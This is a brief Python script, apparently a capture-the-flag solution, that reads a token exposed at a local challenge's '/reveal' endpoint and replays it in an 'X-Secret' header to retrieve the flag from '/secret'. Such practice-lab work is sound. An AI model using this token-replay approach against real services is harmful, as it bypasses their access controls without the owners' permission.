import requests

# Replace this with the URL of the challenge
challenge_url = 'http://challenge.localhost:80'

# Get the secret token from the /reveal endpoint
reveal_response = requests.get(challenge_url + '/reveal')
secret_token = reveal_response.text.strip()  # Removing any leading/trailing whitespace

# Print the cleaned secret token for debugging purposes
print("Secret token:", repr(secret_token))

# Make a GET request to the /secret endpoint, including the X-Secret header
secret_response = requests.get(challenge_url + '/secret', headers={'X-Secret': secret_token})

# Print the response, which should include the flag
print(secret_response.text)
print(reveal_response.headers)
